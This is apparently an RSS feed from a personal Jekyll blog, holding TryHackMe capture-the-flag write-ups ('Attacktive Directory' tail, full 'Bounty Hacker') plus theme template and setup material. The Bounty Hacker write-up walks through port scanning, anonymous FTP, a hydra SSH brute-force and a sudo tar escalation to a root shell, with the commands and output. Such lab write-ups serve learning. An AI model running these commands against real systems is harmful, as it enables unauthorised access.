&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;s&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         4/4/2020  12:18 PM             28 user.txt.txt


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt.txt
T&lt;span class=&quot;k&quot;&gt;************************&lt;/span&gt;h&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;

&lt;p&gt;I learnd a lot in this room about attackting the Active Directory. Some Tools i have used for the first time. So i had to goolge the usage of the tools. But now i have a better understanding how i can enumerate a windows Active Directory.&lt;/p&gt;
</description>
        <pubDate>Thu, 24 Sep 2020 23:14:00 +0000</pubDate>
        <link>/blog/attacktivedirectory/</link>
        <guid isPermaLink="true">/blog/attacktivedirectory/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - BountyHacker</title>
        <description>&lt;h1 id=&quot;global-information&quot;&gt;Global Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Bounty Hacker&lt;/td&gt;
      &lt;td&gt;24.09.2020&lt;/td&gt;
      &lt;td&gt;Easy&lt;/td&gt;
      &lt;td&gt;Linux, tar, privesc, security&lt;/td&gt;
      &lt;td&gt;4h&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;rustscan&lt;/td&gt;
      &lt;td&gt;rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial  tee output&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;namp&lt;/td&gt;
      &lt;td&gt;nmap -sC -sV -oN FTP-Scan -p 21 10.10.149.155&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;hydra&lt;/td&gt;
      &lt;td&gt;hydra -t 16 -l l** -P locks.txt 10.10.149.155 ssh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;ssh l**@10.10.149.155&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;tar&lt;/td&gt;
      &lt;td&gt;sudo /bin/tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;steps&quot;&gt;Steps:&lt;/h1&gt;

&lt;h2 id=&quot;1-check-for-open-ports&quot;&gt;1 Check for open Ports&lt;/h2&gt;

&lt;p&gt;This is a beginner flagged Room. So i give it a try. It only takes 30min to get the root flag.&lt;/p&gt;

&lt;p&gt;First i started with a rustscan of the Machine. To check witch ports are open on the machine. 
Below the rustscan output.&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rustscan 10.10.149.155 &lt;span class=&quot;nt&quot;&gt;--ulimit&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/initial | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;output                                
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;| &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; |&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;__ &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_   _&lt;span class=&quot;o&quot;&gt;}{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;__  /  ___&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;| |
| .-. &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; |.-._&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; | |  .-._&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/  /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; |
&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;' `-'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'`----'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'  `----'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' `-'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'`-'&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at &quot;/home/pmalle/.config/rustscan/config.toml&quot;
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'&lt;/span&gt;s speed. Use the Docker image, or up the Ulimit with &lt;span class=&quot;s1&quot;&gt;'--ulimit 5000'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 

Open 10.10.149.155:22
Open 10.10.149.155:21
Open 10.10.149.155:80
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;~] Starting Nmap
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; The Nmap &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to be run is nmap &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,21,80 10.10.149.155

Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-09-23 20:27 CEST
Initiating Ping Scan at 20:27
Scanning 10.10.149.155 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2 ports]
Completed Ping Scan at 20:27, 0.06s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 20:27
Completed Parallel DNS resolution of 1 host. at 20:27, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]&lt;/span&gt;
Initiating Connect Scan at 20:27
Scanning 10.10.149.155 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3 ports]
Discovered open port 22/tcp on 10.10.149.155
Discovered open port 80/tcp on 10.10.149.155
Discovered open port 21/tcp on 10.10.149.155
Completed Connect Scan at 20:27, 0.06s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.149.155
Host is up, received syn-ack &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.061s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Scanned at 2020-09-23 20:27:36 CEST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.22 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;p&gt;We see three ports open on the target. (21 FTP, 22 SSH, 80 http)&lt;/p&gt;

&lt;h2 id=&quot;2-check-web-site&quot;&gt;2 Check Web-Site&lt;/h2&gt;

&lt;p&gt;The first thing i was doing was to check the Web-Site. Was looking for the robots.txt file but the file was missing on the target. 
The Website looks normal and nothing interessting was on the site.&lt;/p&gt;

&lt;h2 id=&quot;3-check-with-gobuster&quot;&gt;3 Check with Gobuster&lt;/h2&gt;

&lt;p&gt;I also started a gobuster search for the Website, if some hidden files are on the Server. 
But the only folder gobuster was finding was Images.&lt;/p&gt;

&lt;h2 id=&quot;4-enumerate-ftp-server&quot;&gt;4 Enumerate FTP-Server&lt;/h2&gt;

&lt;p&gt;Next step is to check the FTP server. For this i have started a nmap scan to check if it is possible to login anonymous.&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; FTP-Scan &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21 10.10.149.155        
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-09-23 20:28 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.149.155
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.060s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_Can&lt;span class=&quot;s1&quot;&gt;'t get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.3.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;And bingo, Anonymous login is availalbe on the machine. 
Let’s login with Anonymous to the client and check what i can find on it.&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp 10.10.149.155
Connected to 10.10.149.155.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.149.155:pmalle&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;    1 ftp      ftp           418 Jun 07 21:41 locks.txt
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I downloaded this files from the FTP-Server to my Client.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; get locks.txt
ftp&amp;gt; get task.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Locks.txt is a file with a lot of Names in there. Looks like a directory.
Task.txt is a file where some task are descripted and it contains a username.&lt;/p&gt;

&lt;p&gt;As a hint from TryHackMe, we can Bruteforce ssh with the locks.txt file and the username.&lt;/p&gt;

&lt;h2 id=&quot;5-bruteforce-ssh&quot;&gt;5 Bruteforce ssh&lt;/h2&gt;

&lt;p&gt;So lets fire up hydra and brutefoce the login to ssh:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 16 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; l&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; locks.txt 10.10.149.155 ssh
Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2020-09-23 20:31:43
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:26&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~2 tries per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.10.149.155:22/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 10.10.149.155   login: l&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;   password: R&lt;span class=&quot;k&quot;&gt;****************&lt;/span&gt;3
1 of 1 target successfully completed, 1 valid password found
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Writing restore file because 2 final worker threads did not &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;until &lt;/span&gt;end.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR] 2 targets did not resolve or could not be connected
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR] 0 target did not &lt;span class=&quot;nb&quot;&gt;complete
&lt;/span&gt;Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2020-09-23 20:31:48
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have a username and a login for ssh:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Username: l**&lt;/li&gt;
  &lt;li&gt;Password: R&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;&lt;em&gt;**&lt;/em&gt;3&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;6-login-with-ssh&quot;&gt;6 login with ssh&lt;/h2&gt;

&lt;p&gt;Now lets get on the Machine with ssh:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh l&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;@10.10.149.155
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the User Desktop we found the user.txt file, whitch gave us the User-Flag, i used “cat” to display the content of the file.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User-flag: THM{C&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;*3}&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;7-priv-escalation&quot;&gt;7 Priv-Escalation&lt;/h2&gt;

&lt;p&gt;The last step is to get the Root-Flag.&lt;/p&gt;

&lt;p&gt;For this step i have tried different ways. 
First step was, to check if i can run any commands with sudo. but the “sudo -l” command was protected with password. 
so i thought, ok, i don’t have the password for the user. I will go for LinPeas to check if any other tings are good for Priv Escalation.&lt;/p&gt;

&lt;p&gt;Uploaded Linpeas and run it. But Linpeas give me no Information about any possibilitys.&lt;/p&gt;

&lt;p&gt;I was searching on the box for some Priv-Escalation things i can use.&lt;/p&gt;

&lt;p&gt;Then i was thinking about the “sudo -l” command. I tried it with the password from the ssh-login. And this password was valid.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;lin: 
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;lin on bountyhacker:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User lin may run the following commands on bountyhacker:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /bin/tar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Password is working, and the output shows me, that i can run “tar” as sudo user without password.&lt;/p&gt;

&lt;p&gt;Perfect lets check GTFOBins for Priv-Escalation.&lt;/p&gt;

&lt;p&gt;Found the way:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /bin/tar &lt;span class=&quot;nt&quot;&gt;-cf&lt;/span&gt; /dev/null /dev/null &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
/bin/tar: Removing leading &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Wohoo, i am root. 
Last step is to cat the root file, this was located in “/root/root.txt”&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat root.txt&lt;/span&gt;
THM&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;8&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;This Box was nothing new to me. Only thing with the command “sudo -l” and the password. But thanks it came to my mind that i have a password for the user. Other wise it would be really frustrated.&lt;/p&gt;
</description>
        <pubDate>Thu, 24 Sep 2020 23:14:00 +0000</pubDate>
        <link>/blog/bountyhacker/</link>
        <guid isPermaLink="true">/blog/bountyhacker/</guid>
      </item>
    

    
      
        
      
    
      
    
      
        
          <item>
            <title></title>
            <description>&lt;h3&gt;  {{ page.title }} &lt;/h3&gt;

&lt;div id=&quot;categories&quot;&gt;
{% for category in site.categories %}
  &lt;div class=&quot;category-box&quot; &gt;
    {% capture category_name %}{{ category | first }}{% endcapture %}
    &lt;div id=&quot;#{{ category_name | slugize }}&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;{{ site.baseurl }}/blog/categories/{{ category_name }}&quot;&gt;{{ category_name }}&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;{{ category_name | slugize }}&quot;&gt;&lt;/a&gt;
     {% for post in site.categories[category_name] %}
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6 &gt;&lt;a href=&quot;{{ site.baseurl }}{{ post.url }}&quot;&gt;{{post.title}}&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    {% endfor %}

  &lt;/div&gt;
{% endfor %}
&lt;/div&gt;


</description>
            <link>/blog/categories/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.guides %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>/blog/categories/guides/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    
      
        
          <item>
            <title>Get Started</title>
            <description>## Getting Started - How to use “devlopr-jekyll” theme

## What's Jekyll ?

If you aren’t familiar with Jekyll yet, you should know that it is a static site generator. It will transform your plain text into static websites and blogs. No more databases, slow loading websites, risk of being hacked…just your content. And not only that, with Jekyll you get free hosting with GitHub Pages! If you are a beginner we recommend you start with [Jekyll’s Docs](https://jekyllrb.com/docs/installation/). Now, if you know how to use Jekyll, let’s move on to using this theme in Jekyll:

## Watch Tutorial

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/cXBEfpn0qrg?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;


### Steps to create your blog using devlopr-jekyll and Host using Github Pages :

&gt;  **Step 1.**  Fork the repo - [click here](https://github.com/sujaykundu777/devlopr-jekyll/fork)

![Devlopr Jekyll Repo](/assets/img/posts/fork1.png){:class=&quot;img-fluid&quot;}

&gt; **Step 2.** Use **your-github-username.github.io** as the new repo  ( Replace your-github-username with yours). Remember if you use the name other than your-github-username.github.io , your blog will be built using gh-pages branch.

![Devlopr Jekyll Repo](/assets/img/posts/fork2.png){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork3.png){:class=&quot;img-fluid&quot;}

&gt; **Step 3.** Clone the new repo locally to make changes :

![Devlopr Jekyll Repo](/assets/img/posts/fork31.png){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork32.png){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork33.png){:class=&quot;img-fluid&quot;}

```bash
 $ git clone https://github.com/yourusername/yourusername.github.io
 $ cd yourusername.github.io
 $ code .
```

&gt; **Step 4.** Open the files using VSCode and edit _config.yml and edit with your details:

- _config.yml file - replace with your own details
- _posts - Add your blog posts here
- _includes - You can replace the contents of the files with your data. (contains widgets)
- _assets/img - Add all your images here

